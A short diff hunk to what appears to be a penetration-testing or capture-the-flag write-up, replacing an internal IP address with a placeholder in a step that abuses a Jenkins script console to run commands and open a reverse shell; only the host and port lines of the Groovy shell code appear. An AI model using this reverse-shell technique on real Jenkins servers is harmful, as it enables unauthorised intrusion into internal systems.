@@ -175,7 +175,7 @@ File Type: POSIX shell script, ASCII text executable
 13. traveling to the script console we can abuse this to run commands on the internal jenkins system and get a reverse shell. 
 
 ```shell
-String host="10.2.127.225";
+String host="10.x.x.x";
 
 int port=6666;
 
